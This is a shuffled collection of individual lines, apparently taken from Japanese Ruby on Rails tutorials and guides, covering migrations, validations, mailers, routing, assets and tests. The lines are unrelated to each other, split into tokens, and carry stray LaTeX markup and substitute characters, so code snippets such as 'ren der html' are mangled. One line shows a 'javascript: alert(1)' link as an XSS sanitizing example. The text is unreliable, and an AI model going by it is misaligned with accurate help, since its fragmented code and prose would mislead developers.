ご覧 の とおり 、 \ kode {rails } コマンド を 実行 する と 大量 の ファイル と ディレクトリ が 作成 さ れ ま す 。
条件 は 、 文字 列 、 配列 、 ハッシュ の いずれ か の 方法 で 与え る こと が でき ま す 。
引数 に は 、 曜日 を 表 す 正し い シンボル を 渡 し ま す ( `: monday ` など ) 。
次 に master ブランチ に マージ し て 、 リモート に あ る リポジトリ に 対 し て push し ま す 。
ここ で ` db /migrate/2014 0 12019 1729 _ create_articles ▖rb `   ファイル を エディタ で 開 い て み る と   ( タイム スタンプ は 各自 異な る こと に ご 注意 くださ い ) 、 以下 の よう に な っ て い ま す 。
email = michael % 40 michaelhartl▖ com╼ ╼ This   link  will   expire   in  two  hours▖
X - Runtime:   0 ▖ 0 8349 6
これ を 利用 する に は 、 アプリケーション の development 環境 の 設定 に 手 を 加え る 必要 が あ り ま す   ( リスト \ ref{ code : development_email_settings } ) 。
self を 省略 し た 結果 を リスト \ ref{ code : log _out_with _ forget } に 示 し ま す 。
\ ref{ sec : requiring _ logged_ in_users } で 経験 し て き た よう に 、 Users コントローラ を テスト する ため に 、 アクション 単位 で アクセス 制御 を テスト し ま す 。
#   関連 付け 経由
\ kode {@microposts } インスタンス 変数 を \ kode { show } アクション に 追加 する
     message:  " %{ value } は 予約 済み で す "  
幸い 、 Action   Mailer に は すべて の メール の 配信 前 に 処理 を 加え る ため の フック が 提供 さ れ て い ま す 。
この よう に 、 \ kode {nil } オブジェクト 自身 は \ kode {empty ? } メソッド に は 応答 し な い に も かかわ ら ず 、 \ kode {nil ▖ to_s } と する と 応答 する こと が わか り ま す 。
Client ▖ order ( " created_at  ASC " )
self を 省略 し た 結果 を リスト \ ref{ code : users_controller_test _ signup_ route } に 示 し ま す 。
   validate  : expiration_date_cannot_be_in_the_ past ,
パスワード 再 設定 の プレビュー メソッド   ( 動作 可能 )
この コード は リスト \ ref{ code : authenticated_p_fixed } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
スタイル シート 内 に 共通 の パターン が あ る 場合 は 、 要素 を ネスト さ せ る こと が でき ま す 。
最も 簡単 な 方法 は 、 Rake の \ kode { db : reset } タスク を 実行 し て データベース を リセット する こと で す 。
この コード は モデル 内 に あ る の で \ kode {self } は 省略 でき ま す ▟ 最終 的 に Ruby らし く 書 か れ た コード は 次 の よう に な り ま す 。
この 場合 、 それぞれ の \ kode {div } に は CSS クラス が 与え られ て い ま す 。
これ に よ り 、 エンジン の ルーティング が エンジン 自身 に 制限 さ れ 、 [ test ディレクトリ ] ( # test ディレクトリ ) セクション で 説明 し た よう に 特定 の 位置 に マウント でき る よう に な り ま す 。
エラー メッセージ に スタイル を 与え る ため の CSS
#  config ▖ force _ ssl  =  true
デモ アプリケーション 用 の \ kode { Gemfile } 。
{ nil  => nil ,   1   = >   1 ,   nested : {a :   3 ,   5   = >   5 } } ▖ deep_stringify _keys
語調
assemblies▖ create ( attributes = {})
どれ ほど 十分 に 気 を 付け て い た と し て も 、 Rails アプリケーション の 開発 中 に 何 か 失敗 し て しま う こと は あ り え ま す 。
\ href {https://help▖ubuntu▖ com/community / Image Magick } {Ubuntu の 公式 ドキュメント }   ( 英語 )   で これ を 見つけ ま し た 。
上 の 文 は 以下 の よう に 書 く こと も でき ま す 。
か と い っ て 、 Keep- Alive が 無効 に な っ て い る こと を 当て に する わけ に は い き ま せ ん 。
jQuery ライブラリ に は DOM 操作 用 の 膨大 な メソッド が 提供 さ れ て い ま す が 、 ここ で 使用 する の は わずか 2 つ で す 。
ブラウザ や フィード リーダー が 検出 可能 な RSS フィード や Atom フィード の リンク タグ を 返 し ま す 。
{ 0 } 図 11 ▖ 5 { / 0 }   { 1 } マイクロ ポスト 用 の コード の あ る ユーザー プロフィール ページ   ( ただし マイクロ ポスト が な い ) { / 1 }
\ href { http://sqlitebrowser ▖org / } { DB   Browser   for   SQLite } で 作成 し た \ kode { users } テーブル を 確認 する
####  メイラー を 編集 する
create   app/mailers/application_mailer▖ rb
*   his また は hers ->  theirs に 置き換え る
この よう に テスト する こと で 、 バリデーション の テスト が 失敗 し た とき 、 バリデーション の 実装 に 問題 が あ っ た の か 、 オブジェクト その もの に 問題 が あ っ た の か を 確認 する こと が でき ま す 。
`inquiry ` は 、 文字 列 を ` StringInquirer ` オブジェクト に 変換 し ま す ▟ この オブジェクト を 使用 する と 、 等し い か どう か を より スマート に チェック でき ま す 。
\ kode { name } と \ kode {email } 属性 を アクセス 可能 に する 。
= >   [ 0 ,   1 ,   2 ,   3 ,   4 ,   5 ,   6 ,   7 ,   8 ,   9 ]
上 の 特殊 タグ 以外 に も 、 `: class ` や `: id ` や `: name ` など の 標準 的 な HTML オプション を 最終 的 に ハッシュ に し た もの を 引数 と し て 与え る こと が でき ま す 。
  #  POST   / users
現在 の 状態 を 確認 し て み ま しょ う 。
認証 の ため に まったく 新し い モジュール を 作 る こと も 可能 で す が 、 Sessions コントローラ に は 既に \ kode { SessionsHelper } と い う モジュール が 備わ っ て い ま す 。
    encoded_content  =  SpecialEncode ( File ▖ read ( '/ path/to /filename▖ jpg ') )
###  Gemfile
試作 フィード が あ る Home ページ の モックアップ
invoke     js
パスワード 再 設定 で 使用 する 属性 を 追加 し た User モデル
   g ▖ test _framework   : test _unit
すべて の テスト を 実行 する に は 以下 の よう に し ま す 。
               : prevent_ delivery _ to_ guests ,
#### file_field
self を 省略 し た 結果 を リスト \ ref{ code :initial_micropost _spec } に 示 し ま す 。
NOTE : _ 通常 の Web アプリケーション 開発 上 で 必要 と な る セキュリティ 上 の 注意 と 同様 の 注意 が Ajax に 対 し て も 必要 で す 。
@assembly_ count  = @ part ▖ assemblies▖ size
他 の マニフェスト や 、 個別 の スタイル シート / Java Script ファイル を インク ルード し た い 場合 は 、 ` config/initializers/assets▖rb ` の ` precompile ` と い う 配列 を 使用 し ま す 。
###  Active   Record  Observer と Action   Controller   Sweeper
###  コード を 書 く
これ は 、 ` get ` 、 ` post ` メソッド など が 作業 を 委譲 する とき に 使 わ れ る 手法 で す 。
     articles   GET     /articles ( ▖: format )            articles #index
###  Web サーバー を 起動 する
   validate  : active_ customer ,   on : : create
\ kode { create } アクション に 空 の \ kode {@feed \_items } インスタンス 変数 を 追加 する
パーシャル を 使用 し た new ユーザー ビュー 。
図 \ ref { fig :user_ model_ password_digest } の よう な データ モデル に する ため に 、 まず は \ kode { password\_digest } カラム 用 の 適切 な マイグレーション を 生成 し ま す 。
  = >   2
#   gem  ' debugger ' , group : [: development ,  : test ]
a 1   =   A ▖ new
ドキュメント は 簡潔 で あ り 、 かつ 全体 を 理解 でき る もの で あ る こと 。
    mail ( to :  user ▖email ,
これ で 、 少な く とも サイン イン の ルート を 追加 する まで の 間 、 リンク と 名前 付き ルート が 完成 し ま し た ( 第 \ ref { cha : log _ in_log _out } 章 ) 。
この 場合 、 \ kode {div } タグ に も CSS クラス   ( \kode {container} )   が 与え られ て い ま す 。
te}╼╼    %  subsection   destroying _microposts   ( end ) ╼╼\ subsection { フィード 画面 に お け る マイクロ ポスト の テスト } %  ( fold) ╼\ label{ sec : micropost _tests}╼╼
Article ▖ first ▖ categories▖any?
config ▖ assets▖ cache_store   =  : memory _ store
複合 インデックス の 詳細 に つ い て は [ My SQL の マニュアル ] ( http://dev▖mysql▖ com/doc/refman / 5 ▖ 6 / en/multiple- column - indexes▖html )   ( 英語 )   を 参照 し て くださ い 。
< h 2 > Add a  comment: </ h 2 >
Rails の デフォルト で は 、 主 キー カラム の 名前 に ` id ` が 使用 さ れ ま す   ( なお ` id ` に し た い 場合 は 値 を 設定 する 必要 は あ り ま せ ん ) 。
*   Protected   Attributes を 使用 し て い な い の で あ れ ば 、 ` whitelist_attributes ` や `mass_assignment_sanitizer ` オプション など 、 この gem に 関連 する すべて の オプション を 削除 でき ま す 。
パーシャル を 呼び出 す とき に 、 一緒 に 変数 を 渡 す こと が でき る
#  Use   Capistrano  for   deployment
この メソッド は 、 その よう な 命名 慣習 に 従 っ て い る 言語   ( Java Script など )   で 使用 さ れ る 名前 を 求め る の に 便利 で す 。
1人 の ユーザー に 複数 の マイクロ ポスト が あ る 。
Sessions コントローラ の \ kode { create } アクション が 完成 し た ところ   ( まだ 動 き ま せ ん ) 。
### ` config/ secrets▖yml `
resources  : articles   do
\ ref{ sec : signup _ form } の ユーザー 登録 ページ の とき と 同様 に 、 図 \ ref { fig: login_mockup } モックアップ を 元 に セッション 新規 開始 用 の ログ インフォーム を 作成 し ま す 。
## #  無名 モジュール
最後 に 、 本 チュートリアル で 使 う こと は あ り ま せ ん が 、 ユーザー を 有効 に し た とき の 日時 も 念 の ため に 記録 し て お き ま す 。
関連 付け   ( association )   で は 、 外部 キー の 名前 を 推測 する とき に この メソッド を 使用 し ま す ▟ たとえば ` has _one ` と ` has_many ` で は 以下 を 行 っ て い ま す 。
初期 化 コード の 置き 場所
# =>  Fri ,   0 6   Aug  2010   17 : 11 : 58   CEST   + 0 2 : 0 0
Active   Job は 、 ジョブ 作成 用 の Rails ジェネレータ を 提供 し て い ま す 。
ちなみ に 、 \ kode {private } キー ワード 以降 の コード は 、 強調 の ため \ kode { create_remember_token } の インデント を 1 段 深 く し て あ り ま す
Rails に は 豊富 な 検証 機能 が あ り 、 存在 確認 、 カラム で の 重複 確認 、 フォーマット 確認 、 関連 付け られ た オブジェクト が あ る か どう か の 確認 など が 行え ま す 。
[ " 1 " ,   " 2 " ,   " 3 " ]
    return if  self [ " Cache - Control " ] ▖ present ?
該当 の コントローラ に 属 する レイアウト が な い 場合 、 ` app/views/layouts/application ▖html ▖erb ` また は ` app/views/layouts/application▖builder ` を 使用 し ま す 。
{ 0 } 図 1 ▖ 7 { / 0 } { 1 } GitHub の リポジトリ ページ ▟ \ href { http://railstutorial ▖org / images/figures/github_ repository _ page _ 4_ 0 - full ▖ png } { ( 拡大 ) } { / 1 }
    <td ><%=  book▖ content %></td>
単に 「 + 1 」 と あ り がち な コメント を 残 す だけ で は 、 他 の レビュアー は ほとんど 注目 し て くれ な い で しょ う 。
###  コントローラ で データ を 保存 する
self を 省略 し た 結果 を リスト \ ref{ code : test _helper_ sign_in } に 示 し ま す 。
person ▖errors ▖ messages # => {}
最後 に 、 以下 の 2 つ の ファイル が この リソース の アセット と し て 生成 さ れ ま す 。
postgresql://local host/my_ database
=> nil
エンジン の レイアウト を ユーザー に 強制 し た く な い 場合 は 、 この ファイル を 削除 し 、 エンジン の コントローラ で は 別 の レイアウト を 参照 する よう に 変更 し て くださ い 。
置き換え た 結果 を リスト \ ref{ code : password _ migration } に 示 し ま す 。
SELECT  *  FROM   articles   WHERE   ` trashed`  =   0
Action   View
     class_ name :  " Order "
*   Rails   4 ▖ 0 で は ` ActionDispatch : : Performance Test ` の 導入 に 伴 い ` Action Controller : : Performance Test ` が 非 推奨 と な り ま し た 。
` new` で `@ article ` と い う インスタンス 変数 が 新た に 作成 さ れ る よう に な り ま し た ▟ これ を 何 に 使 う の か は すぐ に わか り ま す 。
\ kode { Gemfile } に CarrierWave を 追加 する
上 の よう に 関連 付け を 追加 し た こと で 、 特定 の 顧客 用 に 新し い 注文 を 1 つ 作成 する 作業 が 以下 の よう に 一行 で でき る よう に な り ま し た 。
nick ▖ save
[ * Ruby   on   Rails   Tutorial * ] (http://railstutorial▖jp/)
ここ で \ kode {: page } パラメーター に は \ kode { params [ : page ] } が 使用 さ れ て い ま す が 、 これ は \ kode {will\_ paginate } に よ っ て 自動 的 に 生成 さ れ ま す 。
*  `config ▖ assets▖ version ` は MD 5 ハッシュ 生成 に 使用 さ れ る オプション 文字 列 で す 。
\ label{table :url_ mapping } }╼\end{table}╼╼\ subsection { Contact ページ } %  ( fold) ╼\ label{ sec : contact _ page } ╼╼
マイグレーション コマンド に よ っ て Articles テーブル が データベース 上 に 作成 さ れ ま す 。
    x   =   x   +   1
この 時点 で は 、 以下 の テスト スイート は 失敗 する はず で す 。
_ これ ら の フィールド も エスケープ する よう に し て くださ い 。
上 の コマンド で は 、 テスト を 生成 し な い と い う オプション を 指定 し て い る こと に ご 注目 くださ い 。
\ kode { paginate } で は 、 キー が \ kode {: page } で 値 が ページ 番号 の ハッシュ を 引数 に 取 り ま す 。
これ は リスト \ ref{ code : test _helper_ sign_in } で 使用 さ れ て い ま し た 。
Active   Support は 言語 レベル で 基本 部分 を 底上げ し て 豊か な もの に し 、 Rails アプリケーション の 開発 と Ruby   on   Rails それ 自体 の 開発 に 役立て る べ く 作 ら れ て い ま す 。
これ に よ り 、 これ ら の コンテナ を 通常 の 方法 で 簡単 に 参照 でき 、 どの クラス や どの id 属性 を 使用 す べ き か どう か を 考え ず に 済 み ま す 。
GUI エディタ の 起動 後 も ターミナル を 使用 し 続け る こと は でき ま す ▟ ただし 、 Git は デタッチ 時 に コミット メッセージ が 空 の まま ファイル を 閉じ た と みな す ため 、 コミット は 中断 さ れ ま す 。
▖field_ with _errors  {
上 の コード は 、 ` app/views/shared/_menu▖html ▖erb ` パーシャル の 内容 を その 場所 で レンダリング し ま す 。
以下 の コード は 誤り で す 。
3 つ 目 の 引数 ` indent_empty_ lines ` は 、 空行 も インデント する か どう か を 指定 する フラグ で す 。
*  `reorder `
\ kode {remember_token } を 使用 し て 現在 の ユーザー を 検索 する 。
上 の 例 で も 示 し た よう に 、 Active   Support は 不 規則 な 複数 形 や 非 可算 名詞 に つ い て ある 程度 知 っ て い ま す 。
この 他 に 、 [ Spree ] (https://github▖ com/spree /spree )   ( e コマース プラットフォーム )   や [ Refinery CMS ] (https://github▖ com/refinery / refinerycms )   ( CMS エンジン )   など も あ り ま す 。
英 小 文字 、 数字 、 ハイフン 、 ドット の いずれ か を 少な く とも 1 文字 以上 繰り返 す
     def  set_bu siness_headers
サンプル アプリケーション で bcrypt を 使用 する ため に 、 \ kode {bcrypt - ruby }   gem を \ kode { Gemfile } に 追加 し ま す   ( リスト \ ref{ code :bcrypt_ruby } ) 。
    module  Y
`take ` メソッド で 返 す レコード の 最大 数 を 数値 の 引数 で 指定 する こと も でき ま す 。
特に 、 現在 の サイン イン 失敗 テスト で は この 問題 が キャッチ さ れ ず に パス し て しま い ま す 。
      require   " pry "
NOTE :   これ ら は すべて 同じ 定義 ファイル ` active_ support/core _ext/ date_time/ calculations ▖rb ` に あ り ま す 。
invoice ▖ lines▖to _ formatted_s(:db )  # =>  " 23 ,56 7 , 55 6 , 12 "
詳細 および 重要 な 警告 に つ い て は [ sass - rails ドキュメント ] (https://github▖ com/rails/sass - rails # features ) を 参照 し て くださ い 。
" digest " : " 231 a 680 f 23887 d 9dd 707 10 ea 5efd 3 c 62 " } } , " assets" :{ " application ▖js " :
*  `assets` は 、 scaffold を 生成 する か どう か を 指定 し ま す 。
  <%  if @ article ▖errors▖any ?  
修飾 さ れ て い な い 、 素 の 定数 名 も 使用 でき ま す 。
for   severity  in   Severity▖ constants
ところ で 、 Ruby の 例外 処理 に 慣れ て い る 方 なら 、 \ kode {correct _user } の フィルタ を 以下 の よう に 書 く こと も でき ま す 。
    has_many  : appointments
サイト レイアウト の リンク を 変更 する に は 、 埋め込 み Ruby の 内側 で if -else 分岐 構造 を 使用 し ま す 。
この 編集 ページ 上 で ユーザー に 関 する 情報 を 変更 し 、 [ Update  User ]   ボタン を 押 せ ば 、 Toy アプリケーション 内 の ユーザー 情報 が 変更 さ れ ま す   ( 図 \ ref { fig: demo_update_user_rails _ 3 } ) 。
*   データ が データベース に 永続 的 に 保存 さ れ る 前 に 検証 ( validation ) を 行な う
# => " < p ><a   href = " javascript: alert ( 1 ) " >hello</a></p > "
\ kode {require } が 追加 さ れ て い る こと に 注意 。
"     foo" ▖indent ( 2 )          # => "     foo "
モデル を 作成 する に は ターミナル で 以下 の コマンド を 実行 し ま す 。
    #  ジョブ インスタンス で 行な う 作業
上 の ルーティング は ` photos/ 12 ` に マッチ し 、 ` Photos ` コントローラ の ` show ` アクション に 割り当て られ 、 ` params [ : format ] ` に は ` " jpg " ` が 設定 さ れ ま す 。
*   静的 アセット の 提供
self を 省略 し た 結果 を リスト \ ref{ code : password _ reset_mailer_test } に 示 し ま す 。
self を 省略 し た 結果 を リスト \ ref{ code : development_debugger } に 示 し ま す 。
##### `: touch `
clients =  Client ▖ limit ( 10 )
*   ファイル 名 と コンテンツ を 渡 す と 、 Action   Mailer と [ Mail   gem ] (https://github▖ com/mikel/ mail ) が 自動 的 に mime_type を 推測 し 、 エンコード を 設定 し て ファイル を 添付 し ま す 。
これ は リスト \ ref{ code : signin_features } で 使用 さ れ て い ま し た 。
( プロト)   ステータス フィード の テスト 。
def  article _params
   url:   postgresql://local host/blog_development ?
*   Rails   4 ▖ 0 で は ` ActionDispatch : : Response ` の 導入 に 伴 い ` Action Controller : : AbstractResponse ` が 非 推奨 と な り ま し た 。
\ kode { logged \_ in ? } メソッド
保存 を 行 わ ず に \ kode {reload } を 実行 する と 、 データベース の 情報 を 元 に オブジェクト を 再 読み込 み する の で 、 以下 の よう に 変更 が 取り消 さ れ ま す 。
Unix の プロセス
* `initialize_cache`: ` Rails ▖ cache ` が 未 設定 の 場合 、 ` config▖ cache_store ` の 値 を 参照 し て キャッシュ を 初期 化 し 、 その 結果 を ` Rails ▖ cache ` と し て 保存 し ま す 。
インデックス ビュー で 最初 の リファクタリング を 行 う 。
< small>
    * `:arguments` -   コマンドライン に 与え る 引数 。
この 記法 を 現在 の ユーザー の コンテキスト で 使用 する と 以下 の よう に 簡潔 な コード で 表現 でき る よう に な り ま す 。
ブラウザ を 立ち上げ て ルート URL に アクセス し 、 それぞれ の リンク を クリック し て 確かめ る こと も でき ま す が 、 変更 する 度 に この 作業 を 毎回 繰り返 し て い く の は 大きな 負担 で す 。
ren der html :   "< strong > Not   Found </strong > " ▖html_safe
     create_table  : publications   do  | t |
      xml ▖ description   " Basecamp:   Recent  items "
set_callback   : save ,  :around ,  ->( r , block )  { stuff ;   result   = block ▖ call ; stuff   }
ルーティング を ネスト する   ( 入れ子 に する )   こと で 、 この 親子 関係 を ルーティング で 表 す こと が でき る よう に な り ま す 。
` has_many : through ` 関連 付け は 、 ネスト し た ` has_many ` 関連 付け を 介 し て 「 ショート カット 」 を 設定 する 場合 に も 便利 で す 。
現在 の サンプル アプリケーション に は 、 ユーザー インデックス ページ を 端 から 探 す か 、 他 の ユーザー の フィード を 表示 する 以外 に 、 他 の ユーザー を 検索 する 手段 が あ り ま せ ん 。
#   今年 を デフォルト 値 に 持 ち 、 Date▖ today で 得 られ た 日 の 前後 5 年 を オプション に 持 つ セレクト ボックス を 生成 する
続 い て 、 同じ 内容 の テキスト メール も 作成 し ま しょ う 。
コメント 部分 に コード を 書 け ば 、 \ kode { log _ in_as } ヘルパー メソッド が できあが り ま す   ( リスト \ ref{ code : test _helper_ log _ in } ) 。
% w ( Earth   Wind ) ▖ to_sentence        # => " Earth  and   Wind "
  custom_helpers  ( end ) ╼╼  %  section  motivation   ( end ) ╼╼  \ section { 文字 列 ( string ) と メソッド } %  ( fold) ╼  \ label{ sec : strings_and _ methods }╼╼
` : dependent ` オプション の 動作 は 以下 の よう に 対象 に よ っ て 異な り ま す 。
この コード で 使用 し て い る \ kode { second } メソッド は 、 実 は Ruby 自身 の 一部 で は な く 、 Rails が 追加 し た もの で す 。
バイナリ 実行 可能 ファイル
Action   Dispatcher の ミドルウェアスタック
上 の コード に よ っ て 以下 の よう な 感じ で 生成 さ れ ま す 。
この 画面 に コメント を 表示 でき る よう に し た い の で 、 ` app/views/articles/show ▖html ▖erb ` に 以下 の コード を 追加 し ま しょ う 。
//= require   jquery
##### ` association ( force_ reload   =  false ) `
バリデーション は 、 SQL の データベース へ の 送信 前 に 行 う の が 普通 で す 。
`unscope ` を リレーション に 適用 する と 、 それ に マージ さ れ る すべて の リレーション に も 影響 し ま す 。
ただし 、 以下 の オプション を 設定 し た 関連 付け で は 、 逆 関連 付け は 自動 的 に は 設定 さ れ ま せ ん 。
\ kode {micropost _ params } で Strong   Parameters を 使用 し て い る こと に よ り 、 マイクロ ポスト の コンテンツ だけ が Web 経由 で 編集 可能 に な っ て い る こと に 注目 し て くださ い 。
` assert_valid _keys ` メソッド は 任意 の 数 の 引数 を 取 る こと が でき 、 ホワイト リスト に 含 ま れ て い な い キー が レシーバ に あ る か どう か を チェック し ま す 。
    )
他 に も 、 " ü " と い う 文字 の はず が " Ã ¼ " と い う 文字 に 変わ っ て い る 、 など の 症状 も あ り ま す 。
###  ビュー の アセット ヘルパー 参照 から : cache オプション と : concat オプション を 削除 する
今回 も 同様 に 慣例 に 従 い 、 セッション の 削除   ( サイン アウト )   に は \ kode { destroy } を 使用 し ま す 。
  # @@emulate_booleans に アクセス し て デフォルト 値 を true に する クラス メソッド を 生成
         root   GET     /                            welcome#index
メール の リスト の 形式 は 、 メール アドレス の 配列 で も 、 メール アドレス を カンマ で 区切 っ た 文字 列 で も 構 い ま せ ん 。
        mail ▖ perform_ deliveries =  false
これ は リスト \ ref{ code : before_create_activation_digest } で 使用 さ れ て い ま し た 。
` Rails ▖ application ` は Rails アプリケーション を Rack アプリケーション と し て 実装 し た もの で す 。
####  別 の コントローラ から アクション の テンプレート を 出力 する
git@ heroku▖ com:stormy - cloud - 58 8 1 ▖ herokuapp▖ com
< / footer >
次 に 、 ユーザー を 含 む インスタンス 変数 を 作成 し て ビュー で 使え る よう に し 、 \ kode {user ▖email } に メール 送信 し ま す   ( リスト \ ref{ code :mail _account_activation } ) 。
` dup ` メソッド は ディープ コピー を 行 わ な い の で 、 配列 の 中 に あ る 文字 列 は 複製 後 も 同一 オブジェクト の まま で す 。
マイクロ ポスト 用 の CSS   ( 本章 で 利用 する CSS の すべて )
###  キャッシュ 制御
  http_ basic _authenticate_with   name :  " dhh" ,   password :  " secret " ,   except: [ : index,   : show ]
プロフィール 画面   ( \ href { http://0 ▖ 0 ▖ 0 ▖ 0 : 3000 / users / 2}{ / users / 2 } )   に   [ Follow ]   ボタン が 表示 さ れ て い る
下部 に は ユーザー 作成 用 の フォーム が 表示 さ れ ま す 。
|                     |   20 7                | : multi_status                     |
サーバー を 再 起動 し ま す 。
# </objects>
これ ら の アクション 同士 の 違い は 、 それ ら の アクション に 対応 する \ href { http://en ▖wikipedia ▖org/wiki/ HTTP _request # Request _ methods }{ HTTP  request メソッド } の 違い で も あ り ま す 。
[ 2 ,   4 ,   6 ,   8 ,   10 ] ▖ sum    # = >  30
    Get  help  on  the   Ruby   on   Rails   Tutorial  at  the
よく あ る バリデーション に は 、 存在 性 ・ 長 さ ・ フォーマット など が あ る
デフォルト で は 、 エンジン 内部 の ルーティング は アプリケーション の ルーティング から 分離 さ れ て い ま す 。
###  既存 の ルール を 一覧 表示 する
http://rails -tutorial - c 9 - mhartl▖ c 9 ▖ io/account_activations/╼fFb_F 94 mgQtmlSvRFGsITw/edit ?
suppress ( ActiveRecord : : StaleObjectError )   do
環境 変数 を 経由 し て データベース 接続 を 設定 する 方法 が 2 とおり あ る の で 、 この 2 つ が どの よう に 相互 作用 する か を 理解 し て お く こと が 重要 で す 。
Active   Record で は \emph { 検証   ( バリデーション :   validation )   } を 使用 し て その よう な 制約 を 与え る こと が でき ま す 。
この メソッド を 使 う と 、 ユーザー の メール の テスト を エスケープ でき ま す
次 に ターミナル で 以下 の \ kode { heroku } コマンド を 実行 し ま す   ( 実行 前 に ターミナル の 終了 と 再 起動 が 必要 な こと が あ り ま す ) 。
見つか ら な い 場合 は 次 に ` application/new ` と い う テンプレート が あ る か どう か を 探 し ま す 。
   " DateTime "    => " datetime" ,
これ ら の テスト を 実装 し た こと に よ っ て 、 うっかり 誰 で も 編集 でき て しま う バグ が あ っ て も 、 すぐ に 検知 でき る よう に な り ま し た 。
####  コレクション ルーティング を 追加 する
Active   Record と は 、 [ MVC ] ( http://ja▖wikipedia ▖org/wiki/ Model_View_ Controller ) で 言 う ところ の M 、 つまり モデル に 相当 する もの で あ り 、 ビジネス データ と ビジネス ロジック を 表 す システム の 階層 で す 。
上 の コード は 、 HTML の 部分 を 'another_template ▖html ▖erb ' テンプレート を 使用 し て レンダリング し 、 テキスト 部分 を ` : text ` で レンダリング し て い ま す 。
ここ で は 、 登録 後 に 別 の ページ を 表示 する よう に し 、 その ページ が 新規 作成 さ れ た ユーザー プロファイル で あ る こと が わか る よう に し ま す 。
デフォルト は " 1 " で す が 、 容易 に 変更 でき ま す 。
###  Rack に つ い て 詳し く 学 ぶ
About ページ の コード   GREEN { 2 } { 3 } { / 3 } { 3 } { 4 } { / 4 } { / 3 } { 3 } { / 3}{ / 2 }
MyJob▖set (queue :  :another_queue ) ▖ perform_ later ( record )
{ 0 } 図 3 ▖ 7   { / 0 } { 1 } ルート URL に アクセス する と Home ページ が 表示 さ れ る { / 1 }
Toy アプリケーション の 簡潔 な ユーザー \ kode {index } アクション
デフォルト の エラー メッセージ は  _ " is   reserved " _  で す 。
本書 の テスト スイート は 認証 システム を ほぼ カバー し て い ま す が 、 すべて を カバー し て い る わけ で は あ り ま せ ん ▟ この 点 を ご 了承 くださ い 。
###  テスト を 実行 する
上 の 正規 表現 に は 少し だけ 残念 な 点 が あ り ま す ▟ \ kode { foo@bar▖▖ com } の よう な ドット の 連続 を 誤り と し て 検出 でき ま せ ん 。
データベース の 中 で 合計 を 計算 し た ほう が 高速 に な る こと を 思い出 し て くださ い ▟ )
大 文字 小 文字 を 区別 し な い 、 重複 する メール アドレス の 拒否 の テスト 。
|  key     | key_ len  |  ref    |  rows |   Extra   |
読み込 み 順 に つ い て も 前述 の とおり 反映 さ れ ま す 。
2 )  # => false
Rails アプリケーション を 新規 作成 する 際 に アセット パイプライン を オフ に し た い 場合 は 、 以下 の よう に ` - - skip- sprockets ` オプション を 渡 し ま す 。
Array ▖wrap ( foo:  :bar)  # => [{: foo= >:bar} ]
Markdownd で フォーマット さ れ た 改良 版 \ kode { README } ファイル
リスト \ ref{ code :email_downcase } の メール アドレス 小 文字 変換 を テスト する
これ に よ り rails ▖ js に 含 ま れ る Coffee Script が DOM の 属性 を リッ スン する よう に な り 、 それ ら の 属性 に 適切 な ハンドラ が 与え られ ま す 。
\ kode { destroy } は \ kode { create } の 逆 で す 。
後 は 、 いつ も の よう に フィード パーシャル を 表示 すれ ば Home ページ に フィード を 追加 でき ま す   ( リスト \ ref{ code : home_with _feed } ) 。
The  error  occurred  while  evaluating   nil ▖empty?
特定 の 属性 に アクセス する ため の 、 種類 が " url " の input タグ を 返 し ま す 。
  $  cd  ~/rails _projects/sample_app
\ ref{ sec : the_form_html } で 説明 し た よう に 、 この HTML は \ texttt { POST } リクエスト を / users と い う URL に 送信 し ま す 。
` has_and _belongs_to_many ` 関連 付け を 宣言 し た クラス で は 、 以下 の 16 の メソッド を 自動 的 に 利用 でき る よう に な り ま す 。
サンプル アプリケーション の \ kode { Gemfile } に Guard を 追加 する 。
ユーザー 登録 に アカウント 有効 化 を 追加 する  
やっと マイクロ ポスト 一覧 の コード その もの に たどり着 き ま し た 。
以下 の コマンド で 1 つ 前 の 状態 に 戻 す こと も でき ま す 。
この フォーム の 送信 先 は ` update ` アクション に な り ま す ▟ 今 の 時点 で は 未 定義 で す が 、 この 後 すぐ 定義 し ま す 。
この ` includes ` クエリ の 場合 、 どの 記事 に も コメント が つ い て い な い の で 、 すべて の 記事 が 読み込 ま れ ま す 。
" / Users/ryan/ Sites/side _projects/blorgh/app/views "
Active   Support
` assets: precompile ` を 代り に 使用 し て くださ い 。
章 の 最後 に 、 ユーザー を サイト に ログ イン さ せ る ため の 重要 な 一 歩 を 踏み出 し ま す   ( \ ref{ sec :user_ signup } ) 。
上 の フォーム が 送信 さ れ る 時 に 作成 さ れ る params オブジェクト は 以下 の よう に な り ま す 。
###  HTTP   PATCH
@customer▖ orders << @order 1
#     <rank type =" integer " > 1 < / rank>
` Range # overlaps? ` メソッド は 、 与え られ た 2 つ の 範囲 に ( 空白 で な い ) 重なり が あ る か どう か を チェック し ま す 。
次 に \ kode {bun dle  install } を 実行 し ま す 。
\ kode { admin } 属性 の 変更 が 禁止 さ れ て い る こと を テスト する
config ▖ assets▖js_ compressor   = : uglifier
\ kode {index } アクション に は ログ イン を 要求 する  
\ kode { Gemfile } に Faker を 追加 する
これ は リスト \ ref{ code :edit _update_redirect_tests } で 使用 さ れ て い ま し た 。
[ Sign   out ]   リンク の 表示
もちろん 、 必要 で あ れ ば もっと 詳し く 書 い て くださ い 。
これ ら の コード は 等価 で は あ り ま す が 、 \ kode {assert\_no\_difference } を 使 う 方 が 明瞭 で 、 Ruby の 慣習 的 に も 正し い で す 。
この コード は リスト \ ref{ code :user_ info } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
メソッド で 引数 の 変数 名 に どんな 名前 を 使 っ て も 、 メソッド の 呼び出 し 側 に は 何 の 影響 も 生 じ な い と い う 点 に も ご 注目 くださ い 。
セッション に 含 ま れ る 現在 の ユーザー を 検索 する
また 、 各 リンク を \ texttt{ if } 文 で 囲 い 、 { 1 / } 管理 者 に だけ 削除 リンク が 表示 さ れ る よう に し て い ま す 。
そして 、 Article モデル ` app/models/article ▖ rb ` を 編集 し て 、 他方 の モデル を 追加 する 必要 が あ り ま す 。
この 手法 に は 、 `: original _ process ` が 取得 さ れ る 可能 性 が あ る と い う リスク が あ り ま す 。
コントローラ の 内側 で 定義 さ れ た メソッド は 、 コントローラ の アクション に な り ま す 。
今回 の デモ アプリケーション で は 、 ユーザー と 短 い マイクロ ポスト のみ を サポート する マイクロ ブログ を 作成 し ま す 。
*   アセット パイプライン の メリット
そして 、 issue の 扱い に つ い て 過度 な 期待 を 抱 か な い こと も 肝心 で す 。
options  = {length :   30 ,  omis sion : "▖▖▖"} ▖ merge (options )
